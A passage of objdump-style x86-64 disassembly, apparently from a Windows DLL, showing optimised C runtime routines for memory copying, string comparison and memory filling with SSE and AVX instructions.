   18000d3d7:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   18000d3de:	77 1d                	ja     0x18000d3fd
   18000d3e0:	4c 8d 49 40          	lea    0x40(%rcx),%r9
   18000d3e4:	48 3b ca             	cmp    %rdx,%rcx
   18000d3e7:	4c 0f 47 ca          	cmova  %rdx,%r9
   18000d3eb:	4c 3b ca             	cmp    %rdx,%r9
   18000d3ee:	77 0d                	ja     0x18000d3fd
   18000d3f0:	f6 05 15 d7 00 00 02 	testb  $0x2,0xd715(%rip)        # 0x18001ab0c
   18000d3f7:	0f 85 63 fe ff ff    	jne    0x18000d260
   18000d3fd:	c5 fe 6f 02          	vmovdqu (%rdx),%ymm0
   18000d401:	c4 a1 7e 6f 6c 02 e0 	vmovdqu -0x20(%rdx,%r8,1),%ymm5
   18000d408:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   18000d40f:	0f 86 c3 00 00 00    	jbe    0x18000d4d8
   18000d415:	4c 8b c9             	mov    %rcx,%r9
   18000d418:	49 83 e1 1f          	and    $0x1f,%r9
   18000d41c:	49 83 e9 20          	sub    $0x20,%r9
   18000d420:	49 2b c9             	sub    %r9,%rcx
   18000d423:	49 2b d1             	sub    %r9,%rdx
   18000d426:	4d 03 c1             	add    %r9,%r8
   18000d429:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   18000d430:	0f 86 a2 00 00 00    	jbe    0x18000d4d8
   18000d436:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   18000d43d:	0f 87 3d 01 00 00    	ja     0x18000d580
   18000d443:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   18000d44a:	84 00 00 00 00 00 
   18000d450:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   18000d454:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   18000d459:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   18000d45e:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   18000d463:	c5 fd 7f 09          	vmovdqa %ymm1,(%rcx)
   18000d467:	c5 fd 7f 51 20       	vmovdqa %ymm2,0x20(%rcx)
   18000d46c:	c5 fd 7f 59 40       	vmovdqa %ymm3,0x40(%rcx)
   18000d471:	c5 fd 7f 61 60       	vmovdqa %ymm4,0x60(%rcx)
   18000d476:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   18000d47d:	00 
   18000d47e:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   18000d485:	00 
   18000d486:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   18000d48d:	00 
   18000d48e:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   18000d495:	00 
   18000d496:	c5 fd 7f 89 80 00 00 	vmovdqa %ymm1,0x80(%rcx)
   18000d49d:	00 
   18000d49e:	c5 fd 7f 91 a0 00 00 	vmovdqa %ymm2,0xa0(%rcx)
   18000d4a5:	00 
   18000d4a6:	c5 fd 7f 99 c0 00 00 	vmovdqa %ymm3,0xc0(%rcx)
   18000d4ad:	00 
   18000d4ae:	c5 fd 7f a1 e0 00 00 	vmovdqa %ymm4,0xe0(%rcx)
   18000d4b5:	00 
   18000d4b6:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   18000d4bd:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   18000d4c4:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   18000d4cb:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   18000d4d2:	0f 83 78 ff ff ff    	jae    0x18000d450
   18000d4d8:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   18000d4dc:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   18000d4e0:	4d 8b d9             	mov    %r9,%r11
   18000d4e3:	49 c1 eb 05          	shr    $0x5,%r11
   18000d4e7:	47 8b 9c 9a a0 69 01 	mov    0x169a0(%r10,%r11,4),%r11d
   18000d4ee:	00 
   18000d4ef:	4d 03 da             	add    %r10,%r11
   18000d4f2:	41 ff e3             	jmp    *%r11
   18000d4f5:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   18000d4fc:	ff ff ff 
   18000d4ff:	c4 a1 7e 7f 8c 09 00 	vmovdqu %ymm1,-0x100(%rcx,%r9,1)
   18000d506:	ff ff ff 
   18000d509:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   18000d510:	ff ff ff 
   18000d513:	c4 a1 7e 7f 8c 09 20 	vmovdqu %ymm1,-0xe0(%rcx,%r9,1)
   18000d51a:	ff ff ff 
   18000d51d:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   18000d524:	ff ff ff 
   18000d527:	c4 a1 7e 7f 8c 09 40 	vmovdqu %ymm1,-0xc0(%rcx,%r9,1)
   18000d52e:	ff ff ff 
   18000d531:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   18000d538:	ff ff ff 
   18000d53b:	c4 a1 7e 7f 8c 09 60 	vmovdqu %ymm1,-0xa0(%rcx,%r9,1)
   18000d542:	ff ff ff 
   18000d545:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   18000d54c:	c4 a1 7e 7f 4c 09 80 	vmovdqu %ymm1,-0x80(%rcx,%r9,1)
   18000d553:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   18000d55a:	c4 a1 7e 7f 4c 09 a0 	vmovdqu %ymm1,-0x60(%rcx,%r9,1)
   18000d561:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   18000d568:	c4 a1 7e 7f 4c 09 c0 	vmovdqu %ymm1,-0x40(%rcx,%r9,1)
   18000d56f:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   18000d576:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   18000d57a:	c5 f8 77             	vzeroupper
   18000d57d:	c3                   	ret
   18000d57e:	66 90                	xchg   %ax,%ax
   18000d580:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   18000d584:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   18000d589:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   18000d58e:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   18000d593:	c5 fd e7 09          	vmovntdq %ymm1,(%rcx)
   18000d597:	c5 fd e7 51 20       	vmovntdq %ymm2,0x20(%rcx)
   18000d59c:	c5 fd e7 59 40       	vmovntdq %ymm3,0x40(%rcx)
   18000d5a1:	c5 fd e7 61 60       	vmovntdq %ymm4,0x60(%rcx)
   18000d5a6:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   18000d5ad:	00 
   18000d5ae:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   18000d5b5:	00 
   18000d5b6:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   18000d5bd:	00 
   18000d5be:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   18000d5c5:	00 
   18000d5c6:	c5 fd e7 89 80 00 00 	vmovntdq %ymm1,0x80(%rcx)
   18000d5cd:	00 
   18000d5ce:	c5 fd e7 91 a0 00 00 	vmovntdq %ymm2,0xa0(%rcx)
   18000d5d5:	00 
   18000d5d6:	c5 fd e7 99 c0 00 00 	vmovntdq %ymm3,0xc0(%rcx)
   18000d5dd:	00 
   18000d5de:	c5 fd e7 a1 e0 00 00 	vmovntdq %ymm4,0xe0(%rcx)
   18000d5e5:	00 
   18000d5e6:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   18000d5ed:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   18000d5f4:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   18000d5fb:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   18000d602:	0f 83 78 ff ff ff    	jae    0x18000d580
   18000d608:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   18000d60c:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   18000d610:	4d 8b d9             	mov    %r9,%r11
   18000d613:	49 c1 eb 05          	shr    $0x5,%r11
   18000d617:	47 8b 9c 9a c4 69 01 	mov    0x169c4(%r10,%r11,4),%r11d
   18000d61e:	00 
   18000d61f:	4d 03 da             	add    %r10,%r11
   18000d622:	41 ff e3             	jmp    *%r11
   18000d625:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   18000d62c:	ff ff ff 
   18000d62f:	c4 a1 7d e7 8c 09 00 	vmovntdq %ymm1,-0x100(%rcx,%r9,1)
   18000d636:	ff ff ff 
   18000d639:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   18000d640:	ff ff ff 
   18000d643:	c4 a1 7d e7 8c 09 20 	vmovntdq %ymm1,-0xe0(%rcx,%r9,1)
   18000d64a:	ff ff ff 
   18000d64d:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   18000d654:	ff ff ff 
   18000d657:	c4 a1 7d e7 8c 09 40 	vmovntdq %ymm1,-0xc0(%rcx,%r9,1)
   18000d65e:	ff ff ff 
   18000d661:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   18000d668:	ff ff ff 
   18000d66b:	c4 a1 7d e7 8c 09 60 	vmovntdq %ymm1,-0xa0(%rcx,%r9,1)
   18000d672:	ff ff ff 
   18000d675:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   18000d67c:	c4 a1 7d e7 4c 09 80 	vmovntdq %ymm1,-0x80(%rcx,%r9,1)
   18000d683:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   18000d68a:	c4 a1 7d e7 4c 09 a0 	vmovntdq %ymm1,-0x60(%rcx,%r9,1)
   18000d691:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   18000d698:	c4 a1 7d e7 4c 09 c0 	vmovntdq %ymm1,-0x40(%rcx,%r9,1)
   18000d69f:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   18000d6a6:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   18000d6aa:	0f ae f8             	sfence
   18000d6ad:	c5 f8 77             	vzeroupper
   18000d6b0:	c3                   	ret
   18000d6b1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   18000d6b8:	0f 1f 84 00 00 00 00 
   18000d6bf:	00 
   18000d6c0:	49 81 f8 00 08 00 00 	cmp    $0x800,%r8
   18000d6c7:	76 0d                	jbe    0x18000d6d6
   18000d6c9:	f6 05 3c d4 00 00 02 	testb  $0x2,0xd43c(%rip)        # 0x18001ab0c
   18000d6d0:	0f 85 8a fb ff ff    	jne    0x18000d260
   18000d6d6:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   18000d6da:	f3 42 0f 6f 6c 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm5
   18000d6e1:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   18000d6e8:	0f 86 8e 00 00 00    	jbe    0x18000d77c
   18000d6ee:	4c 8b c9             	mov    %rcx,%r9
   18000d6f1:	49 83 e1 0f          	and    $0xf,%r9
   18000d6f5:	49 83 e9 10          	sub    $0x10,%r9
   18000d6f9:	49 2b c9             	sub    %r9,%rcx
   18000d6fc:	49 2b d1             	sub    %r9,%rdx
   18000d6ff:	4d 03 c1             	add    %r9,%r8
   18000d702:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   18000d709:	76 71                	jbe    0x18000d77c
   18000d70b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000d710:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   18000d714:	f3 0f 6f 52 10       	movdqu 0x10(%rdx),%xmm2
   18000d719:	f3 0f 6f 5a 20       	movdqu 0x20(%rdx),%xmm3
   18000d71e:	f3 0f 6f 62 30       	movdqu 0x30(%rdx),%xmm4
   18000d723:	66 0f 7f 09          	movdqa %xmm1,(%rcx)
   18000d727:	66 0f 7f 51 10       	movdqa %xmm2,0x10(%rcx)
   18000d72c:	66 0f 7f 59 20       	movdqa %xmm3,0x20(%rcx)
   18000d731:	66 0f 7f 61 30       	movdqa %xmm4,0x30(%rcx)
   18000d736:	f3 0f 6f 4a 40       	movdqu 0x40(%rdx),%xmm1
   18000d73b:	f3 0f 6f 52 50       	movdqu 0x50(%rdx),%xmm2
   18000d740:	f3 0f 6f 5a 60       	movdqu 0x60(%rdx),%xmm3
   18000d745:	f3 0f 6f 62 70       	movdqu 0x70(%rdx),%xmm4
   18000d74a:	66 0f 7f 49 40       	movdqa %xmm1,0x40(%rcx)
   18000d74f:	66 0f 7f 51 50       	movdqa %xmm2,0x50(%rcx)
   18000d754:	66 0f 7f 59 60       	movdqa %xmm3,0x60(%rcx)
   18000d759:	66 0f 7f 61 70       	movdqa %xmm4,0x70(%rcx)
   18000d75e:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   18000d765:	48 81 c2 80 00 00 00 	add    $0x80,%rdx
   18000d76c:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   18000d773:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   18000d77a:	73 94                	jae    0x18000d710
   18000d77c:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   18000d780:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   18000d784:	4d 8b d9             	mov    %r9,%r11
   18000d787:	49 c1 eb 04          	shr    $0x4,%r11
   18000d78b:	47 8b 9c 9a e8 69 01 	mov    0x169e8(%r10,%r11,4),%r11d
   18000d792:	00 
   18000d793:	4d 03 da             	add    %r10,%r11
   18000d796:	41 ff e3             	jmp    *%r11
   18000d799:	f3 42 0f 6f 4c 0a 80 	movdqu -0x80(%rdx,%r9,1),%xmm1
   18000d7a0:	f3 42 0f 7f 4c 09 80 	movdqu %xmm1,-0x80(%rcx,%r9,1)
   18000d7a7:	f3 42 0f 6f 4c 0a 90 	movdqu -0x70(%rdx,%r9,1),%xmm1
   18000d7ae:	f3 42 0f 7f 4c 09 90 	movdqu %xmm1,-0x70(%rcx,%r9,1)
   18000d7b5:	f3 42 0f 6f 4c 0a a0 	movdqu -0x60(%rdx,%r9,1),%xmm1
   18000d7bc:	f3 42 0f 7f 4c 09 a0 	movdqu %xmm1,-0x60(%rcx,%r9,1)
   18000d7c3:	f3 42 0f 6f 4c 0a b0 	movdqu -0x50(%rdx,%r9,1),%xmm1
   18000d7ca:	f3 42 0f 7f 4c 09 b0 	movdqu %xmm1,-0x50(%rcx,%r9,1)
   18000d7d1:	f3 42 0f 6f 4c 0a c0 	movdqu -0x40(%rdx,%r9,1),%xmm1
   18000d7d8:	f3 42 0f 7f 4c 09 c0 	movdqu %xmm1,-0x40(%rcx,%r9,1)
   18000d7df:	f3 42 0f 6f 4c 0a d0 	movdqu -0x30(%rdx,%r9,1),%xmm1
   18000d7e6:	f3 42 0f 7f 4c 09 d0 	movdqu %xmm1,-0x30(%rcx,%r9,1)
   18000d7ed:	f3 42 0f 6f 4c 0a e0 	movdqu -0x20(%rdx,%r9,1),%xmm1
   18000d7f4:	f3 42 0f 7f 4c 09 e0 	movdqu %xmm1,-0x20(%rcx,%r9,1)
   18000d7fb:	f3 42 0f 7f 6c 01 f0 	movdqu %xmm5,-0x10(%rcx,%r8,1)
   18000d802:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   18000d806:	c3                   	ret
   18000d807:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000d80e:	00 00 
   18000d810:	0f 10 12             	movups (%rdx),%xmm2
   18000d813:	48 2b d1             	sub    %rcx,%rdx
   18000d816:	49 03 c8             	add    %r8,%rcx
   18000d819:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   18000d81e:	48 83 e9 10          	sub    $0x10,%rcx
   18000d822:	49 83 e8 10          	sub    $0x10,%r8
   18000d826:	f6 c1 0f             	test   $0xf,%cl
   18000d829:	74 18                	je     0x18000d843
   18000d82b:	4c 8b c9             	mov    %rcx,%r9
   18000d82e:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   18000d832:	0f 10 c8             	movups %xmm0,%xmm1
   18000d835:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   18000d839:	41 0f 11 09          	movups %xmm1,(%r9)
   18000d83d:	4c 8b c1             	mov    %rcx,%r8
   18000d840:	4c 2b c0             	sub    %rax,%r8
   18000d843:	4d 8b c8             	mov    %r8,%r9
   18000d846:	49 c1 e9 07          	shr    $0x7,%r9
   18000d84a:	74 71                	je     0x18000d8bd
   18000d84c:	0f 29 01             	movaps %xmm0,(%rcx)
   18000d84f:	eb 16                	jmp    0x18000d867
   18000d851:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   18000d858:	0f 1f 84 00 00 00 00 
   18000d85f:	00 
   18000d860:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   18000d864:	0f 29 09             	movaps %xmm1,(%rcx)
   18000d867:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   18000d86c:	0f 10 4c 11 e0       	movups -0x20(%rcx,%rdx,1),%xmm1
   18000d871:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   18000d878:	0f 29 41 70          	movaps %xmm0,0x70(%rcx)
   18000d87c:	0f 29 49 60          	movaps %xmm1,0x60(%rcx)
   18000d880:	0f 10 44 11 50       	movups 0x50(%rcx,%rdx,1),%xmm0
   18000d885:	0f 10 4c 11 40       	movups 0x40(%rcx,%rdx,1),%xmm1
   18000d88a:	49 ff c9             	dec    %r9
   18000d88d:	0f 29 41 50          	movaps %xmm0,0x50(%rcx)
   18000d891:	0f 29 49 40          	movaps %xmm1,0x40(%rcx)
   18000d895:	0f 10 44 11 30       	movups 0x30(%rcx,%rdx,1),%xmm0
   18000d89a:	0f 10 4c 11 20       	movups 0x20(%rcx,%rdx,1),%xmm1
   18000d89f:	0f 29 41 30          	movaps %xmm0,0x30(%rcx)
   18000d8a3:	0f 29 49 20          	movaps %xmm1,0x20(%rcx)
   18000d8a7:	0f 10 44 11 10       	movups 0x10(%rcx,%rdx,1),%xmm0
   18000d8ac:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   18000d8b0:	75 ae                	jne    0x18000d860
   18000d8b2:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   18000d8b6:	49 83 e0 7f          	and    $0x7f,%r8
   18000d8ba:	0f 28 c1             	movaps %xmm1,%xmm0
   18000d8bd:	4d 8b c8             	mov    %r8,%r9
   18000d8c0:	49 c1 e9 04          	shr    $0x4,%r9
   18000d8c4:	74 1a                	je     0x18000d8e0
   18000d8c6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000d8cd:	00 00 00 
   18000d8d0:	0f 11 01             	movups %xmm0,(%rcx)
   18000d8d3:	48 83 e9 10          	sub    $0x10,%rcx
   18000d8d7:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   18000d8db:	49 ff c9             	dec    %r9
   18000d8de:	75 f0                	jne    0x18000d8d0
   18000d8e0:	49 83 e0 0f          	and    $0xf,%r8
   18000d8e4:	74 03                	je     0x18000d8e9
   18000d8e6:	0f 11 10             	movups %xmm2,(%rax)
   18000d8e9:	0f 11 01             	movups %xmm0,(%rcx)
   18000d8ec:	c3                   	ret
   18000d8ed:	cc                   	int3
   18000d8ee:	cc                   	int3
   18000d8ef:	cc                   	int3
   18000d8f0:	cc                   	int3
   18000d8f1:	cc                   	int3
   18000d8f2:	cc                   	int3
   18000d8f3:	cc                   	int3
   18000d8f4:	cc                   	int3
   18000d8f5:	cc                   	int3
   18000d8f6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000d8fd:	00 00 00 
   18000d900:	48 2b d1             	sub    %rcx,%rdx
   18000d903:	4d 85 c0             	test   %r8,%r8
   18000d906:	74 6a                	je     0x18000d972
   18000d908:	f7 c1 07 00 00 00    	test   $0x7,%ecx
   18000d90e:	74 1d                	je     0x18000d92d
   18000d910:	0f b6 01             	movzbl (%rcx),%eax
   18000d913:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   18000d916:	75 5d                	jne    0x18000d975
   18000d918:	48 ff c1             	inc    %rcx
   18000d91b:	49 ff c8             	dec    %r8
   18000d91e:	74 52                	je     0x18000d972
   18000d920:	84 c0                	test   %al,%al
   18000d922:	74 4e                	je     0x18000d972
   18000d924:	48 f7 c1 07 00 00 00 	test   $0x7,%rcx
   18000d92b:	75 e3                	jne    0x18000d910
   18000d92d:	49 bb 80 80 80 80 80 	movabs $0x8080808080808080,%r11
   18000d934:	80 80 80 
   18000d937:	49 ba ff fe fe fe fe 	movabs $0xfefefefefefefeff,%r10
   18000d93e:	fe fe fe 
   18000d941:	8d 04 0a             	lea    (%rdx,%rcx,1),%eax
   18000d944:	25 ff 0f 00 00       	and    $0xfff,%eax
   18000d949:	3d f8 0f 00 00       	cmp    $0xff8,%eax
   18000d94e:	77 c0                	ja     0x18000d910
   18000d950:	48 8b 01             	mov    (%rcx),%rax
   18000d953:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   18000d957:	75 b7                	jne    0x18000d910
   18000d959:	48 83 c1 08          	add    $0x8,%rcx
   18000d95d:	49 83 e8 08          	sub    $0x8,%r8
   18000d961:	76 0f                	jbe    0x18000d972
   18000d963:	4d 8d 0c 02          	lea    (%r10,%rax,1),%r9
   18000d967:	48 f7 d0             	not    %rax
   18000d96a:	49 23 c1             	and    %r9,%rax
   18000d96d:	49 85 c3             	test   %rax,%r11
   18000d970:	74 cf                	je     0x18000d941
   18000d972:	33 c0                	xor    %eax,%eax
   18000d974:	c3                   	ret
   18000d975:	48 1b c0             	sbb    %rax,%rax
   18000d978:	48 83 c8 01          	or     $0x1,%rax
   18000d97c:	c3                   	ret
   18000d97d:	cc                   	int3
   18000d97e:	cc                   	int3
   18000d97f:	cc                   	int3
   18000d980:	cc                   	int3
   18000d981:	cc                   	int3
   18000d982:	cc                   	int3
   18000d983:	cc                   	int3
   18000d984:	cc                   	int3
   18000d985:	cc                   	int3
   18000d986:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000d98d:	00 00 00 
   18000d990:	cc                   	int3
   18000d991:	cc                   	int3
   18000d992:	cc                   	int3
   18000d993:	cc                   	int3
   18000d994:	cc                   	int3
   18000d995:	cc                   	int3
   18000d996:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000d99d:	00 00 00 
   18000d9a0:	57                   	push   %rdi
   18000d9a1:	8b c2                	mov    %edx,%eax
   18000d9a3:	48 8b f9             	mov    %rcx,%rdi
   18000d9a6:	49 8b c8             	mov    %r8,%rcx
   18000d9a9:	f3 aa                	rep stos %al,(%rdi)
   18000d9ab:	49 8b c1             	mov    %r9,%rax
   18000d9ae:	5f                   	pop    %rdi
   18000d9af:	c3                   	ret
   18000d9b0:	48 8b c1             	mov    %rcx,%rax
   18000d9b3:	4c 8b c9             	mov    %rcx,%r9
   18000d9b6:	4c 8d 15 43 26 ff ff 	lea    -0xd9bd(%rip),%r10        # 0x180000000
   18000d9bd:	0f b6 d2             	movzbl %dl,%edx
   18000d9c0:	49 bb 01 01 01 01 01 	movabs $0x101010101010101,%r11
   18000d9c7:	01 01 01 
   18000d9ca:	4c 0f af da          	imul   %rdx,%r11
   18000d9ce:	66 49 0f 6e c3       	movq   %r11,%xmm0
   18000d9d3:	49 83 f8 0f          	cmp    $0xf,%r8
   18000d9d7:	0f 87 83 00 00 00    	ja     0x18000da60
   18000d9dd:	0f 1f 00             	nopl   (%rax)
   18000d9e0:	49 03 c8             	add    %r8,%rcx
   18000d9e3:	47 8b 8c 82 10 6a 01 	mov    0x16a10(%r10,%r8,4),%r9d
   18000d9ea:	00 
   18000d9eb:	4d 03 ca             	add    %r10,%r9
   18000d9ee:	41 ff e1             	jmp    *%r9
   18000d9f1:	4c 89 59 f1          	mov    %r11,-0xf(%rcx)
   18000d9f5:	44 89 59 f9          	mov    %r11d,-0x7(%rcx)
   18000d9f9:	66 44 89 59 fd       	mov    %r11w,-0x3(%rcx)
   18000d9fe:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   18000da02:	c3                   	ret
   18000da03:	4c 89 59 f2          	mov    %r11,-0xe(%rcx)
   18000da07:	44 89 59 fa          	mov    %r11d,-0x6(%rcx)
   18000da0b:	66 44 89 59 fe       	mov    %r11w,-0x2(%rcx)
   18000da10:	c3                   	ret
   18000da11:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   18000da18:	0f 1f 84 00 00 00 00 
   18000da1f:	00 
   18000da20:	4c 89 59 f3          	mov    %r11,-0xd(%rcx)
   18000da24:	44 89 59 fb          	mov    %r11d,-0x5(%rcx)
   18000da28:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   18000da2c:	c3                   	ret
   18000da2d:	0f 1f 00             	nopl   (%rax)
   18000da30:	4c 89 59 f4          	mov    %r11,-0xc(%rcx)
   18000da34:	44 89 59 fc          	mov    %r11d,-0x4(%rcx)
   18000da38:	c3                   	ret
   18000da39:	4c 89 59 f5          	mov    %r11,-0xb(%rcx)
   18000da3d:	66 44 89 59 fd       	mov    %r11w,-0x3(%rcx)
   18000da42:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   18000da46:	c3                   	ret
   18000da47:	4c 89 59 f7          	mov    %r11,-0x9(%rcx)
   18000da4b:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   18000da4f:	c3                   	ret
   18000da50:	4c 89 59 f6          	mov    %r11,-0xa(%rcx)
   18000da54:	66 44 89 59 fe       	mov    %r11w,-0x2(%rcx)
   18000da59:	c3                   	ret
   18000da5a:	4c 89 59 f8          	mov    %r11,-0x8(%rcx)
   18000da5e:	c3                   	ret
   18000da5f:	90                   	nop
   18000da60:	66 0f 6c c0          	punpcklqdq %xmm0,%xmm0
   18000da64:	49 83 f8 20          	cmp    $0x20,%r8
   18000da68:	77 0c                	ja     0x18000da76
   18000da6a:	f3 0f 7f 01          	movdqu %xmm0,(%rcx)
   18000da6e:	f3 42 0f 7f 44 01 f0 	movdqu %xmm0,-0x10(%rcx,%r8,1)
   18000da75:	c3                   	ret
   18000da76:	83 3d d3 c5 00 00 03 	cmpl   $0x3,0xc5d3(%rip)        # 0x18001a050
   18000da7d:	0f 82 dd 01 00 00    	jb     0x18000dc60
   18000da83:	4c 3b 05 ce c5 00 00 	cmp    0xc5ce(%rip),%r8        # 0x18001a058
   18000da8a:	76 16                	jbe    0x18000daa2
   18000da8c:	4c 3b 05 cd c5 00 00 	cmp    0xc5cd(%rip),%r8        # 0x18001a060
   18000da93:	77 0d                	ja     0x18000daa2
   18000da95:	f6 05 70 d0 00 00 02 	testb  $0x2,0xd070(%rip)        # 0x18001ab0c
   18000da9c:	0f 85 fe fe ff ff    	jne    0x18000d9a0
   18000daa2:	c4 e3 7d 18 c0 01    	vinsertf128 $0x1,%xmm0,%ymm0,%ymm0
   18000daa8:	4c 8b c9             	mov    %rcx,%r9
   18000daab:	49 83 e1 1f          	and    $0x1f,%r9
   18000daaf:	49 83 e9 20          	sub    $0x20,%r9
   18000dab3:	49 2b c9             	sub    %r9,%rcx
   18000dab6:	49 2b d1             	sub    %r9,%rdx
   18000dab9:	4d 03 c1             	add    %r9,%r8
   18000dabc:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   18000dac3:	76 65                	jbe    0x18000db2a
   18000dac5:	4c 3b 05 94 c5 00 00 	cmp    0xc594(%rip),%r8        # 0x18001a060
   18000dacc:	0f 87 ce 00 00 00    	ja     0x18000dba0
   18000dad2:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   18000dad9:	1f 84 00 00 00 00 00 
   18000dae0:	c5 fd 7f 01          	vmovdqa %ymm0,(%rcx)
   18000dae4:	c5 fd 7f 41 20       	vmovdqa %ymm0,0x20(%rcx)
   18000dae9:	c5 fd 7f 41 40       	vmovdqa %ymm0,0x40(%rcx)
   18000daee:	c5 fd 7f 41 60       	vmovdqa %ymm0,0x60(%rcx)
   18000daf3:	c5 fd 7f 81 80 00 00 	vmovdqa %ymm0,0x80(%rcx)
   18000dafa:	00 
   18000dafb:	c5 fd 7f 81 a0 00 00 	vmovdqa %ymm0,0xa0(%rcx)
   18000db02:	00 
   18000db03:	c5 fd 7f 81 c0 00 00 	vmovdqa %ymm0,0xc0(%rcx)
   18000db0a:	00 
   18000db0b:	c5 fd 7f 81 e0 00 00 	vmovdqa %ymm0,0xe0(%rcx)
   18000db12:	00 
   18000db13:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   18000db1a:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
